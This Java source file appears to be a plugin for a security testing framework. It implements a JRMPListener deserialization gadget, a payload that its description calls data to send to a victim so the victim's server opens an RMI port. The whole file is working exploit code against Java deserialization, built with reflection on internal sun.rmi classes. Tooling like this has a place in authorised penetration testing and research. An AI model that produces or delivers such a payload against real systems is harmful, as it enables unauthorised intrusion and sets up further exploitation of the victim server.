package me.gv7.woodpecker.plugin.gadgets.other;

import me.gv7.woodpecker.plugin.annotation.Description;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;
import me.gv7.woodpecker.plugin.gadgets.util.Reflections;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastServerRef;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;

@Description("用于在服务器端创建一个jrmpListener 监听端口，这是需要发送给受害者的数据，让受害者开启一个rmi端口。")
@RequireParameter("Port")
public class JRMPListener implements ObjectPayload {
    @Override
    public <T> Object getObject(Input input) throws Exception {
        int jrmpPort = Integer.parseInt(input.getPort());
        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
                RemoteRef.class
        }, new Object[] {
                new UnicastServerRef(jrmpPort)
        });

        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
        return uro;
    }
}
